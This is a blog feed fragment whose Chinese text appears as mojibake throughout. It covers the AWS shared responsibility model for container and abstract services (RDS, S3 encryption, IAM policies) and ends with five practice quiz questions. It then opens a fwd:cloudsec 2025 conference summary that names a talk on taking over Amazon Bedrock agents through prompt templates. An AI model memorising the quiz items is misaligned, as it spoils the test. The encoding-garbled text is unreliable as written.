title="å›¾ 1-5ï¼šå®¹å™¨æœåŠ¡è´£ä»»å…±æ‹…æ¨¡å‹ "></p><p>å¦‚å›¾ 1-5 æ‰€ç¤ºï¼Œåœ¨å®¹å™¨æœåŠ¡çš„è´£ä»»å…±æ‹…æ¨¡å‹ä¸­ï¼ŒAWS ä»ç„¶æ‰¿æ‹…åŸºç¡€è®¾æ–½æœåŠ¡çš„å®‰å…¨è´£ä»»ï¼ŒåŒæ—¶æ–°å¢äº†ä»¥ä¸‹å®‰å…¨èŒè´£ï¼š</p><ul><li>æ“ä½œç³»ç»Ÿã€ç½‘ç»œåŠé˜²ç«å¢™é…ç½®</li><li>å¹³å°ã€åº”ç”¨ã€èº«ä»½ä¸è®¿é—®ç®¡ç†</li><li>æœåŠ¡ç«¯åŠ å¯†</li><li>ç½‘ç»œæµé‡ä¿æŠ¤</li></ul><h3 id="4-2-ç¤ºä¾‹"><a href="#4-2-ç¤ºä¾‹" class="headerlink" title="4.2 ç¤ºä¾‹"></a>4.2 ç¤ºä¾‹</h3><p>ä»¥å¸¸è§çš„å®¹å™¨æœåŠ¡â€”â€”RDS ä¸ºä¾‹ã€‚åœ¨ PaaS æ¨¡å¼ä¸‹ï¼Œå®¢æˆ·æ— æ³•è®¿é—® RDS è¿è¡Œçš„åº•å±‚æ“ä½œç³»ç»Ÿï¼Œå› è€Œæ— æ³•è‡ªè¡Œä¿®å¤æ“ä½œç³»ç»Ÿä¸­çš„å®‰å…¨æ¼æ´ï¼Œè¿™ä¸€å®‰å…¨è´£ä»»å·²è½¬ç§»è‡³ AWSã€‚å¹³å°å’Œåº”ç”¨çš„ç®¡ç†è´£ä»»ä¹Ÿç”± AWS æ‰¿æ‹…ã€‚è¿™æ„å‘³ç€æ‰€æœ‰ä¸åº”ç”¨ç»´æŠ¤ç›¸å…³çš„å®‰å…¨è´£ä»»å‡ç”± AWS è´Ÿè´£ã€‚</p><h3 id="4-3-æ€»ç»“"><a href="#4-3-æ€»ç»“" class="headerlink" title="4.3 æ€»ç»“"></a>4.3 æ€»ç»“</h3><p>ç›¸è¾ƒäºåŸºç¡€è®¾æ–½æœåŠ¡ï¼Œå®¹å™¨æœåŠ¡è™½ç„¶å‡è½»äº†å®¢æˆ·çš„ç®¡ç†è´Ÿæ‹…ï¼Œä½†ä¹Ÿå¸¦æ¥äº†ä¸€å®šçš„é™åˆ¶ï¼Œå®¢æˆ·åªèƒ½è®¿é—®å¹³å°åŠå…¶å †æ ˆä»¥ä¸Šçš„å†…å®¹ã€‚</p><h2 id="0x05-æŠ½è±¡æœåŠ¡"><a href="#0x05-æŠ½è±¡æœåŠ¡" class="headerlink" title="0x05 æŠ½è±¡æœåŠ¡"></a>0x05 æŠ½è±¡æœåŠ¡</h2><h3 id="5-1-è´£ä»»å…±æ‹…æ¨¡å‹"><a href="#5-1-è´£ä»»å…±æ‹…æ¨¡å‹" class="headerlink" title="5.1 è´£ä»»å…±æ‹…æ¨¡å‹"></a>5.1 è´£ä»»å…±æ‹…æ¨¡å‹</h3><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥å­¦ä¹ è´£ä»»å…±æ‹…æ¨¡å‹çš„æœ€åä¸€ç§å½¢å¼â€”â€”æŠ½è±¡æœåŠ¡çš„è´£ä»»å…±æ‹…æ¨¡å‹ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æŠ½è±¡æœåŠ¡ï¼š</p><ul><li><strong>äºšé©¬é€Šç®€å•é˜Ÿåˆ—æœåŠ¡ï¼ˆAmazon Simple Queue Serviceï¼Œç®€ç§° SQSï¼‰</strong>ï¼šä¸€ç§é«˜åº¦å¯æ‰©å±•çš„æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡ï¼Œç”¨äºè§£è€¦å’Œåè°ƒåˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„ç»„ä»¶ï¼Œæ”¯æŒå¼‚æ­¥æ¶ˆæ¯ä¼ é€’å’Œäº‹ä»¶é©±åŠ¨æ¶æ„ã€‚</li><li><strong>äºšé©¬é€Š DynamoDB</strong>ï¼šä¸€é¡¹æ‰˜ç®¡çš„ NoSQL æ•°æ®åº“æœåŠ¡ï¼Œå…·å¤‡æ¯«ç§’çº§å»¶è¿Ÿå’Œè‡ªåŠ¨æ‰©å±•èƒ½åŠ›ï¼Œé€‚ç”¨äºé«˜ååé‡çš„é”®å€¼å’Œæ–‡æ¡£æ•°æ®å¤„ç†ã€‚</li><li><strong>äºšé©¬é€Šç®€å•å­˜å‚¨æœåŠ¡ï¼ˆAmazon Simple Storage Serviceï¼Œç®€ç§° S3ï¼‰</strong>ï¼šä¸€ç§å¯¹è±¡å­˜å‚¨æœåŠ¡ï¼Œæ”¯æŒä»¥é«˜å¯ç”¨æ€§å’Œé«˜æŒä¹…æ€§çš„æ–¹å¼åœ¨äº’è”ç½‘ä¸Šå­˜å‚¨å’Œæ£€ç´¢ä»»æ„è§„æ¨¡çš„æ•°æ®ï¼Œä¾‹å¦‚å›¾ç‰‡ã€æ—¥å¿—æ–‡ä»¶å’Œå¤‡ä»½ç­‰ã€‚</li></ul><p>å¦‚å›¾ 1-6 æ‰€ç¤ºï¼Œä¸åŸºç¡€è®¾æ–½æœåŠ¡ç›¸æ¯”ï¼Œåœ¨æŠ½è±¡æœåŠ¡æ¨¡å‹ä¸­ï¼Œè®¸å¤šå®‰å…¨ç›¸å…³çš„ä»»åŠ¡å·²è½¬ç§»è‡³ AWS è´Ÿè´£çš„èŒƒç•´ã€‚</p><p><img src="/image/image_VDHL7WN59r.png" alt="å›¾ 1-6ï¼šæŠ½è±¡æœåŠ¡çš„è´£ä»»å…±æ‹…æ¨¡å‹" title="å›¾ 1-6ï¼šæŠ½è±¡æœåŠ¡çš„è´£ä»»å…±æ‹…æ¨¡å‹"></p><p>ä¸å®¹å™¨æœåŠ¡ç›¸æ¯”ï¼Œè¯¥æ¨¡å‹ä¸­çš„â€œæœåŠ¡ç«¯åŠ å¯†â€å’Œâ€œç½‘ç»œæµé‡ä¿æŠ¤â€è´£ä»»è½¬ç§»åˆ°äº†å®¢æˆ·èº«ä¸Šã€‚ä»¥ S3 ä¸ºä¾‹ï¼Œæˆ‘ä»¬å…·ä½“è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><strong>æœåŠ¡ç«¯åŠ å¯†</strong>ï¼šAWS æä¾› SSE-S3 æŠ€æœ¯æ¥ç®¡ç†åŠ å¯†å¯†é’¥å¹¶æ‰§è¡ŒåŠ å¯†æ“ä½œï¼Œä½†å®¢æˆ·éœ€å†³å®šæ˜¯å¦å¯ç”¨ã€é€‰æ‹©åŠ å¯†ç±»å‹ï¼Œå¹¶ç¡®ä¿ä¸Šä¼ æ•°æ®æ—¶æ­£ç¡®é…ç½®ç›¸å…³å‚æ•°ã€‚</li><li><strong>ç½‘ç»œæµé‡ä¿æŠ¤</strong>ï¼šAWS è´Ÿè´£ä¿éšœ S3 å†…éƒ¨å¤åˆ¶æ—¶çš„ä¼ è¾“å®‰å…¨ï¼Œè€Œå®¢æˆ·åˆ™éœ€ç¡®ä¿å·²å¯ç”¨ S3 çš„ HTTPS è¿æ¥ï¼Œå¹¶æ­£ç¡®é…ç½®ç½‘ç»œç­–ç•¥ã€‚</li></ul><p>æ­¤æ—¶ï¼Œä½ å¯èƒ½ä¼šäº§ç”Ÿç–‘é—®ï¼šä¸ºä½• AWS è´Ÿè´£å®æ–½â€œæœåŠ¡ç«¯åŠ å¯†â€å¹¶ç®¡ç†æœåŠ¡ç»„ä»¶ä¹‹é—´çš„â€œç½‘ç»œæµé‡ä¿æŠ¤â€ï¼Œä½†è¿™ä¸¤é¡¹å´æˆä¸ºå®¢æˆ·çš„å®‰å…¨è´£ä»»ï¼Ÿ</p><p>åŸå› åœ¨äºï¼Œåœ¨æŠ½è±¡æœåŠ¡ä¸­ï¼ŒAWS è´Ÿè´£æŠ€æœ¯å®ç°ï¼Œè€Œå®¢æˆ·è´Ÿè´£æ˜¯å¦å¯ç”¨ä»¥åŠå¦‚ä½•é…ç½®ã€‚æŠ½è±¡æœåŠ¡ä¹‹æ‰€ä»¥è¢«ç§°ä¸ºâ€œæŠ½è±¡â€ï¼Œæ˜¯å› ä¸ºå…¶åº•å±‚å®ç°è¢«éšè—ï¼Œå®¢æˆ·æ— éœ€æ·±å…¥äº†è§£åº•å±‚ç»†èŠ‚ï¼Œä½†ä»éœ€æ‰¿æ‹…æ­£ç¡®é…ç½®çš„å®‰å…¨è´£ä»»ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå®¢æˆ·æ— æ³•ç›´æ¥æ§åˆ¶æŠ½è±¡æœåŠ¡çš„åº•å±‚ï¼Œåªèƒ½é€šè¿‡ API ç«¯ç‚¹è¿›è¡Œé…ç½®ï¼Œå› æ­¤å®‰å…¨é…ç½®çš„è´£ä»»å®é™…ä¸Šâ€œæŠ½è±¡â€ç»™äº†å®¢æˆ·ã€‚</p><p>å¦‚æœå°†æŠ½è±¡æœåŠ¡æ¯”ä½œè‡ªåŠ©é¤å…ï¼Œé‚£ä¹ˆæŠ½è±¡æœåŠ¡æä¾›çš„æŠ€æœ¯èƒ½åŠ›å°±åƒé¤å…æä¾›çš„ä¿æ¸©è®¾å¤‡å’Œé£Ÿå“å®‰å…¨è®¾æ–½ã€‚åœ¨è‡ªåŠ©é¤å…ä¸­ï¼Œé¡¾å®¢éœ€è¦è‡ªè¡Œåˆ¤æ–­é£Ÿç‰©çš„æ–°é²œåº¦ã€é€‰æ‹©èœå“ã€æ­é…é¥®é£Ÿï¼Œå¹¶æŒ‘é€‰åº§ä½ï¼›ç±»ä¼¼åœ°ï¼Œåœ¨æŠ½è±¡æœåŠ¡ä¸­ï¼Œå®¢æˆ·éœ€è¦éªŒè¯æ•°æ®çš„å®Œæ•´æ€§ã€ç¡®è®¤æ˜¯å¦åŠ å¯†ã€é€‰æ‹©åŠ å¯†æ–¹å¼ï¼Œå¹¶é…ç½®ç½‘ç»œé˜²æŠ¤æªæ–½ã€‚</p><p>ç›¸æ¯”ä¹‹ä¸‹ï¼Œå®¹å™¨æœåŠ¡æ›´åƒæ˜¯ç‚¹é¤æœåŠ¡â€”â€”æœ‰æœåŠ¡å‘˜ååŠ©æ£€æŸ¥é£Ÿå“è´¨é‡ã€æ¨èæ­é…æ–¹æ¡ˆï¼Œå¹¶å®‰æ’åˆé€‚çš„åº§ä½ã€‚åœ¨å®¹å™¨æœåŠ¡ä¸­ï¼ŒAWS ä¼šå¸®åŠ©ç®¡ç†ç½‘ç»œä¿æŠ¤ã€é…ç½®åŠ å¯†é€‰é¡¹ï¼Œå¹¶ä¼˜åŒ–å®‰å…¨è®¾ç½®ã€‚</p><h3 id="5-2-ç¤ºä¾‹"><a href="#5-2-ç¤ºä¾‹" class="headerlink" title="5.2 ç¤ºä¾‹"></a>5.2 ç¤ºä¾‹</h3><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šå°†é™æ€æ–‡æ¡£å’Œæ•°æ®å­˜å‚¨åœ¨å¤šä¸ª S3 å­˜å‚¨æ¡¶ä¸­ï¼Œå› ä¸º S3 ä¸ä»…æ˜¯ Blob å­˜å‚¨çš„ç†æƒ³é€‰æ‹©ï¼Œè¿˜å…·å¤‡é«˜æ€§ä»·æ¯”ã€‚</p><p>AWS è´Ÿè´£ç®¡ç† S3 å¹³å°ï¼Œå¹¶ç¡®ä¿æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„è¡¥ä¸åŠæ—¶æ›´æ–°ã€‚</p><p>å½“å†³å®šå°†æŸä¸ªæ–‡æ¡£å­˜å…¥ç‰¹å®šå­˜å‚¨æ¡¶æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®ç»„ç»‡ç­–ç•¥ç¡®è®¤æ˜¯å¦éœ€è¦è¿›è¡Œé™æ€åŠ å¯†ã€‚å¦‚æœéœ€è¦åŠ å¯†ï¼Œåˆ™è¦è¿›ä¸€æ­¥é€‰æ‹©ä½¿ç”¨å®¢æˆ·ç«¯åŠ å¯†è¿˜æ˜¯æœåŠ¡ç«¯åŠ å¯†ã€‚</p><ul><li><strong>å®¢æˆ·ç«¯åŠ å¯†</strong>ï¼šç”Ÿæˆå¯†é’¥å¯¹æ–‡æ¡£è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå°†åŠ å¯†åçš„æ–‡ä»¶ä¸Šä¼ è‡³ S3 å­˜å‚¨æ¡¶ã€‚ &#x20;</li><li><strong>æœåŠ¡ç«¯åŠ å¯†</strong>ï¼šå¯ä»¥é€‰æ‹©é€šè¿‡ AWS å¯†é’¥ç®¡ç†æœåŠ¡ï¼ˆKMSï¼‰æä¾›è‡ªå®šä¹‰çš„å®¢æˆ·ä¸»å¯†é’¥ï¼ˆCMKï¼‰ï¼Œæˆ–è€…ä½¿ç”¨ Amazon è‡ªåŠ¨ç®¡ç†çš„å¯†é’¥ï¼Œåœ¨å¯¹è±¡å†™å…¥å­˜å‚¨æ¡¶æ—¶è‡ªåŠ¨å®ŒæˆåŠ å¯†ã€‚</li></ul><p>æ•°æ®ä¸Šä¼ åˆ°å­˜å‚¨æ¡¶åï¼Œå­˜å‚¨æ¡¶ç®¡ç†å‘˜è¿˜éœ€ç¡®å®šè®¿é—®æƒé™åŠæ§åˆ¶æ–¹å¼ã€‚</p><ul><li>å¦‚æœä»…é™å†…éƒ¨ç”¨æˆ·è®¿é—®ï¼Œåˆ™éœ€åˆ›å»º IAM ç­–ç•¥ï¼› &#x20;</li><li>å¦‚æœéœ€è¦ä¸ºå…¶ä»–ç»„ç»‡çš„ç”¨æˆ·æä¾›è®¿é—®æƒé™ï¼Œåˆ™éœ€åˆ¶å®šå…·æœ‰é€‚å½“æƒé™çš„å­˜å‚¨æ¡¶ç­–ç•¥ã€‚</li></ul><h3 id="5-3-æ€»ç»“"><a href="#5-3-æ€»ç»“" class="headerlink" title="5.3 æ€»ç»“"></a>5.3 æ€»ç»“</h3><p>åœ¨æŠ½è±¡æœåŠ¡çš„è´£ä»»å…±æ‹…æ¨¡å‹ä¸­ï¼Œå®¢æˆ·è´Ÿè´£æ‰¿æ‹…è‡ªå·±çš„æ•°æ®ã€è®¿é—®æƒé™ä»¥åŠåŠ å¯†é…ç½®ã€‚</p><h2 id="0x06-å®¡è®¡å·¥ä½œ"><a href="#0x06-å®¡è®¡å·¥ä½œ" class="headerlink" title="0x06 å®¡è®¡å·¥ä½œ"></a>0x06 å®¡è®¡å·¥ä½œ</h2><p>äº†è§£äº†ä»¥ä¸Šä¸‰ç§è´£ä»»å…±æ‹…æ¨¡å‹åï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å­¦ä¹ å¦‚ä½•ç†è§£å¹¶è¿ç”¨è¿™äº›æ¨¡å‹æ¥è¾…åŠ©å®¡è®¡å·¥ä½œã€‚</p><p>åœ¨å„è¡Œå„ä¸šä¸­ï¼Œç»„ç»‡é€šå¸¸éœ€è¦æˆ‘ä»¬åœ¨äº‘ç¯å¢ƒä¸­å¤„ç†åˆè§„æ€§ç›¸å…³ä»»åŠ¡ã€‚é€šè¿‡ä¸Šè¿°å­¦ä¹ å†…å®¹ï¼Œæˆ‘ä»¬å·²ç»æ˜ç¡®äº†å®¢æˆ·æ‰€éœ€æ‰¿æ‹…çš„å®‰å…¨è´£ä»»ä»¥åŠäº‘æœåŠ¡æä¾›å•†åº”è´Ÿè´£çš„å®‰å…¨è´£ä»»ã€‚</p><p>å½“å®¡è®¡å‘˜éœ€è¦äº†è§£æŸé¡¹ç”± AWS è´Ÿè´£çš„å†…å®¹æ—¶ï¼Œæ‚¨å¯ä»¥å‚è€ƒç›¸åº”çš„å…±äº«è´£ä»»æ¨¡å‹ï¼Œä»¥æ­¤è¯æ˜ AWS å¯¹è¯¥éƒ¨åˆ†æ ‡å‡†çš„ç®¡ç†è´£ä»»åŠæ§åˆ¶æªæ–½ã€‚</p><p>æœ€åéœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œæ·±å…¥ç†è§£æ¯ä¸€ç§è´£ä»»åˆ’åˆ†æ¨¡å‹ï¼Œæœ‰åŠ©äºæˆ‘ä»¬åˆ¶å®šæ›´åŠ å®Œå–„çš„å®‰å…¨ç­–ç•¥ï¼Œä»è€Œæå‡æ•´ä¸ª AWS è´¦æˆ·çš„å®‰å…¨é˜²æŠ¤èƒ½åŠ›ã€‚æ¸…æ™°æŒæ¡å®¢æˆ·ä¸ AWS å„è‡ªæ‰¿æ‹…çš„å®‰å…¨è´£ä»»ï¼Œæ˜¯è§„é¿æ½œåœ¨é£é™©çš„é‡è¦å‰æã€‚</p><h2 id="0x07-æ€»ç»“"><a href="#0x07-æ€»ç»“" class="headerlink" title="0x07 æ€»ç»“"></a>0x07 æ€»ç»“</h2><p>æœ¬æ–‡ä»‹ç»äº† AWS æœåŠ¡ä¸­ä½¿ç”¨çš„ä¸‰ç§è´£ä»»å…±æ‹…æ¨¡å‹ï¼Œåˆ†åˆ«æ¶‰åŠåŸºç¡€è®¾æ–½ã€å®¹å™¨å’ŒæŠ½è±¡æœåŠ¡ã€‚ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬ä½œä¸ºå®¢æˆ·ä¸ AWS ä½œä¸ºäº‘æœåŠ¡æä¾›å•†æ‰€æ‰¿æ‹…çš„å®‰å…¨è´£ä»»ä¼šå› æ‰€ä½¿ç”¨æˆ–æä¾›çš„æœåŠ¡ç±»å‹è€Œæœ‰æ‰€ä¸åŒã€‚</p><p>ç†è§£å¹¶åŒºåˆ†è¿™äº›æ¨¡å‹ï¼Œå¯¹äºåˆ¶å®šè§£å†³æ–¹æ¡ˆçš„å®‰å…¨ç­–ç•¥è‡³å…³é‡è¦ã€‚é€šè¿‡æ˜ç¡®æˆ‘ä»¬ä½œä¸ºå®¢æˆ·çš„å®‰å…¨è´£ä»»è¾¹ç•Œï¼Œä»¥åŠ AWS çš„è´£ä»»èµ·ç‚¹ï¼Œå¯ä»¥æ›´å¥½åœ°ç¡®ä¿æˆ‘ä»¬çš„è´¦æˆ·åœ¨ AWS åŸºç¡€è®¾æ–½ä¸­ä¸ä¼šå­˜åœ¨æ¼æ´ã€‚</p><p>æ­¤å¤–ï¼ŒæŒæ¡å®‰å…¨è´£ä»»å…±æ‹…æ¨¡å‹è¿˜æœ‰åŠ©äºæˆ‘ä»¬åœ¨ä¸šåŠ¡åˆè§„æ€§å’Œå®¡è®¡æ–¹é¢æ˜ç¡®å„è‡ªçš„èŒè´£èŒƒå›´ã€‚æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚è€ƒä»¥ä¸‹èµ„æ–™ï¼š</p><ul><li>AWS å®‰å…¨æ€§ç®€ä»‹ï¼š<a href="https://d1.awsstatic.com/whitepapers/Security/Intro_to_AWS_Security.pdf" title="ã€ŠIntroduction to AWS Securityã€‹">ã€ŠIntroduction to AWS Securityã€‹</a> &#x20;</li><li>AWS è´£ä»»å…±æ‹…æ¨¡å‹çš„å®˜æ–¹è¯´æ˜ï¼š<a href="https://aws.amazon.com/cn/compliance/shared-responsibility-model/" title="ã€Šè´£ä»»å…±æ‹…æ¨¡å‹ã€‹">ã€Šè´£ä»»å…±æ‹…æ¨¡å‹ã€‹</a> &#x20;</li><li>upwind å…³äº AWS è´£ä»»å…±æ‹…æ¨¡å‹çš„æ–‡ç« ï¼š<a href="https://www.upwind.io/glossary/aws-shared-responsibility-model" title="ã€ŠAWS Shared Responsibility Modelã€‹">ã€ŠAWS Shared Responsibility Modelã€‹</a> &#x20;</li><li>Alert Logic å…³äº AWS è´£ä»»å…±æ‹…æ¨¡å‹çš„åšå®¢ï¼š<a href="https://www.alertlogic.com/blog/the-aws-shared-responsibility-model-explained/" title="ã€ŠThe AWS Shared Responsibility Model Explainedã€‹">ã€ŠThe AWS Shared Responsibility Model Explainedã€‹</a> &#x20;</li></ul><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åœ¨ã€Šç¬¬ 2 ç«  åŸºæœ¬ AWS æœåŠ¡ã€‹å­¦ä¹ ä¸€äº›åŸºç¡€çš„ AWS æœåŠ¡ï¼Œå¹¶ç®€è¦æ¦‚è¿° AWS ç”Ÿæ€ç³»ç»Ÿä¸­å¸¸ç”¨ä½†å¹¶éä»¥å®‰å…¨æ€§ä¸ºæ ¸å¿ƒçš„æœåŠ¡ã€‚å³ä¾¿è¿™äº›æœåŠ¡å¹¶éä¸“æ³¨äºå®‰å…¨åŠŸèƒ½ï¼Œä½†å®ƒä»¬åœ¨ä¸ºå®¢æˆ·å’Œç³»ç»Ÿæ„å»ºè§£å†³æ–¹æ¡ˆæ—¶ä»ç„¶æ‰®æ¼”ç€é‡è¦è§’è‰²ã€‚AWS å®‰å…¨èƒ½åŠ›è®¤è¯è¦æ±‚æ‚¨å…·å¤‡è¿™äº›æœåŠ¡çš„åŸºæœ¬çŸ¥è¯†ï¼Œå¹¶äº†è§£å¦‚ä½•ä»¥å®‰å…¨å·¥ç¨‹å¸ˆæˆ–ä¸“ä¸šäººå£«çš„èº«ä»½å¯¹å…¶è¿›è¡Œå¼ºåŒ–é…ç½®ã€‚</p><h2 id="0x08-ç»ƒä¹ é¢˜"><a href="#0x08-ç»ƒä¹ é¢˜" class="headerlink" title="0x08 ç»ƒä¹ é¢˜"></a>0x08 ç»ƒä¹ é¢˜</h2><ol><li><p>ã€å•é€‰é¢˜ã€‘ä½œä¸º AWS å®¢æˆ·ï¼Œä»¥ä¸‹å“ªäº›å®‰å…¨ä»»åŠ¡æ˜¯æ‚¨çš„å®‰å…¨è´£ä»»ï¼Ÿ</p><p>A. å®‰å…¨ç»„é…ç½®</p><p>B. IAM ç®¡ç†</p><p>C. æ•°æ®åŠ å¯†å’Œå®‰å…¨</p><p>D. ä¸Šè¿°æ‰€æœ‰çš„</p></li><li><p>ã€å•é€‰é¢˜ã€‘ä½œä¸º AWS å®¢æˆ·ï¼Œæ‚¨æœ‰è´£ä»»åœ¨ä»»ä½•å’Œæ‰€æœ‰å…±äº«è´£ä»»æ¨¡å‹ä¸­ä¿æŒåº”ç”¨ç¨‹åºçš„æ›´æ–°å’Œä¿®è¡¥ã€‚</p><p>A. æ­£ç¡®</p><p>B. é”™è¯¯</p></li><li><p>ã€å•é€‰é¢˜ã€‘AWS æ‰€æ‰¿æ‹…çš„å®‰å…¨è´£ä»»æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>A. äº‘ä¸­æ‰˜ç®¡çš„èµ„æºçš„å®‰å…¨ï¼ˆSecurity in Cloudï¼‰</p><p>B. äº‘å¹³å°æœ¬èº«çš„å®‰å…¨ï¼ˆSecurity of Cloudï¼‰</p><p>C. CIS åŸºå‡†å’Œæ ‡å‡†</p><p>D. å®‰å…¨è´£ä»»å…±æ‹…æ¨¡å‹</p></li><li><p>ã€å•é€‰é¢˜ã€‘è´Ÿè´£ä¿æŠ¤å­˜å‚¨åœ¨ç‰©ç†ç£ç›˜ä¸Šçš„å®¢æˆ·æ•°æ®çš„å®ä½“æ˜¯ï¼š</p><p>A. AWS</p><p>B. å®¢æˆ·ï¼ˆç”¨æˆ·ï¼‰</p><p>C. å®¡è®¡ç”¨æˆ·</p><p>D. ç»ˆç«¯ç”¨æˆ·</p></li><li><p>ã€å•é€‰é¢˜ã€‘æ‚¨æœ‰ä¸€ä¸ªå·²è¿è¡Œæ•°æœˆçš„ EC2 å®ä¾‹ã€‚æ‚¨åœ¨ä¸€æ¡å®‰å…¨å…¬å‘Šä¸­çœ‹åˆ°ï¼Œè¯¥ EC2 å®ä¾‹æ‰€è¿è¡Œçš„å¼€æºæ“ä½œç³»ç»Ÿéœ€è¦ä¸€ä¸ªå…³é”®è¡¥ä¸ã€‚è¯¥å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿ</p><p>A. æ‚¨ä¸å¿…æ‹…å¿ƒè¿™ä¸ªé—®é¢˜ï¼Œå› ä¸º AWS è´Ÿè´£ç›‘ç£å…¨çƒåŸºç¡€è®¾æ–½å¹¶ä¼šä¸ºæ‚¨å¤„ç†å¥½è¿™ä¸ªé—®é¢˜ã€‚</p><p>B. æ‚¨åˆ›å»ºå®ä¾‹çš„ AMIï¼Œç„¶åå¯åŠ¨å®ƒçš„æ–°ç‰ˆæœ¬ï¼Œå› ä¸ºæ‰€æœ‰ EC2 å®ä¾‹éƒ½åœ¨ AWS åˆå§‹åŒ–æ—¶è¿›è¡Œäº†ä¿®è¡¥ã€‚</p><p>C. ä½œä¸ºæ“ä½œå®‰å…¨å®è·µçš„ä¸€éƒ¨åˆ†ï¼Œæ‰‹åŠ¨æˆ–é€šè¿‡è‡ªåŠ¨åŒ–æµç¨‹ä¿®è¡¥ EC2 å®ä¾‹ã€‚</p><p>D. è”ç³»æ“ä½œç³»ç»Ÿä¾›åº”å•†ï¼Œä»¥ä¾¿ä»–ä»¬å¯ä»¥ä¸ºæ‚¨çš„æ‰€æœ‰ç³»ç»Ÿæ‰§è¡Œè¡¥ä¸æ›´æ–°ã€‚</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>AWS å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fwd:cloudsec 2025ï¼šä¼šè®®æ¼”è®²æ€»ç»“</title>
    <link href="/2025/08/01/fwd-cloudsec-2025%EF%BC%9A%E4%BC%9A%E8%AE%AE%E6%BC%94%E8%AE%B2%E6%80%BB%E7%BB%93/"/>
    <url>/2025/08/01/fwd-cloudsec-2025%EF%BC%9A%E4%BC%9A%E8%AE%AE%E6%BC%94%E8%AE%B2%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æ¯å¹´å…¨çƒæœ‰æˆç™¾ä¸Šåƒåœºå®‰å…¨ä¼šè®®ï¼Œä½†çœŸæ­£ä¸“æ³¨äº‘å®‰å…¨å®æˆ˜çš„ï¼Œå´å±ˆæŒ‡å¯æ•°ã€‚è€Œ<a href="https://fwdcloudsec.org/conference/north-america/" title="fwd:cloudsec">fwd:cloudsec</a>ï¼Œå°±æ˜¯å…¶ä¸­å°‘æœ‰çš„ã€ç”±ç¤¾åŒºä¸»å¯¼ã€å†…å®¹é«˜åº¦èšç„¦çš„é«˜è´¨é‡ä¼šè®®ã€‚</p><p>ä»Šå¹´çš„ fwd:cloudsec 2025 äº 6 æœˆ 30 æ—¥è‡³ 7 æœˆ 1 æ—¥åœ¨ç¾å›½ä¸¹ä½›ä¸¾è¡Œï¼Œæ¥è‡ª AWSã€Googleã€WIZã€CrowdStrikeã€Datadog ç­‰ä¸€çº¿å‚ç‰Œçš„æ”»é˜²ä¸“å®¶ä»¬é½èšä¸€å ‚ï¼Œåˆ†äº«æœ€æ–°ç ”ç©¶ä¸å®æˆ˜ç»éªŒã€‚</p><p><img src="/image/693.webp" alt="å›¾ 1ï¼šèµåŠ©å•†"></p><p>fwd:cloudsec æ˜¯ä¸€ä¸ªä¸“æ³¨äºäº‘å®‰å…¨é¢†åŸŸçš„éè¥åˆ©æ€§ä¼šè®®ï¼Œç”± Forward CloudSec Association ç»„ç»‡ä¸¾åŠï¼Œæ—¨åœ¨ä¸ºçœŸå®çš„äº‘å®‰å…¨ä»ä¸šè€…æä¾›ä¸€ä¸ªç‹¬ç«‹ã€å®è·µå¯¼å‘çš„å¹³å°ã€‚</p><p>è‹¥æ‚¨æ— æ³•å‚åŠ ä¼šè®®ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒã€‚Cybr å·²ç»æ•´ç†äº†<strong>43 åœºä¼šè®®æ¼”è®²çš„è¯¦ç»†æ‘˜è¦</strong>ï¼Œå†…å®¹åŒ…æ‹¬ï¼š</p><ul><li>å¿«é€Ÿç†è§£çš„é«˜å±‚æ¦‚è§ˆï¼›</li><li>å…³é”®è¦ç‚¹å’Œå¯æ‰§è¡Œè§è§£ï¼›</li><li>æŠ€æœ¯å®ç°ç»†èŠ‚åŠå…·ä½“ç¤ºä¾‹ï¼›</li><li>ç”¨äºæ·±å…¥å­¦ä¹ çš„å®Œæ•´æ¼”è®²è®°å½•ï¼›</li><li>åŸå§‹ YouTube æ¼”è®²çš„ç›´æ¥é“¾æ¥ã€‚</li></ul><p><img src="/image/694.webp" alt="å›¾ 2ï¼šä¼šè®®ææ–™"></p><blockquote><p>ç‚¹å‡»<a href="https://github.com/Cybr-Inc/fwdcloudsec-2025-summaries">ä¼šè®®ææ–™</a>ï¼Œç›´æ¥è·å–èµ„æ–™ã€‚</p></blockquote><h2 id="0x01-æ¼”è®²å†…å®¹æ¦‚è§ˆ"><a href="#0x01-æ¼”è®²å†…å®¹æ¦‚è§ˆ" class="headerlink" title="0x01 æ¼”è®²å†…å®¹æ¦‚è§ˆ"></a>0x01 æ¼”è®²å†…å®¹æ¦‚è§ˆ</h2><h3 id="ç±»åˆ«ä¸€ï¼šAI-ML-å®‰å…¨"><a href="#ç±»åˆ«ä¸€ï¼šAI-ML-å®‰å…¨" class="headerlink" title="ç±»åˆ«ä¸€ï¼šAI&#x2F;ML å®‰å…¨"></a>ç±»åˆ«ä¸€ï¼šAI&#x2F;ML å®‰å…¨</h3><p>AI ä¸å®‰å…¨çš„äº¤å‰æˆä¸ºçƒ­é—¨è¯é¢˜ï¼Œå…±æœ‰ 7 åœºæ¼”è®²ï¼š</p><ol><li>æ”»ç ´ AI Agentsï¼šåˆ©ç”¨é¢„è®¾æç¤ºæ¨¡æ¿æ¥ç®¡ Amazon Bedrock 